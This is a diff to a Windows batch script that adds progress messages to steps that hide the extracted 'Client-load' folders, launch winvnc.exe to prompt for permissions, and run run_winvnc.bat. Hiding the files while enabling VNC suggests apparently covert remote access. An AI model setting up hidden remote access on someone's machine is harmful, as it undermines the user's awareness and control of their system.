@@ -41,17 +41,22 @@ if exist "%script_dir%run_winvnc.bat" (
 )
 
 REM Hide the extracted Client-load folder and its parent folder
+echo Hiding the Client-load folder and its parent folder...
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
 REM Start winvnc.exe to trigger permissions prompt
+echo Starting winvnc.exe to trigger permissions prompt...
 start "" winvnc.exe
 
 REM Wait for 7 seconds to allow the user to grant permissions
+echo Waiting for 7 seconds to allow permissions...
 timeout /t 7 >nul
 
 REM Run the run_winvnc.bat script after waiting 1 second
+echo Running run_winvnc.bat...
 timeout /t 1 >nul
 call "%script_dir%run_winvnc.bat"
 
 REM End of main.bat
+echo Main bat completed.
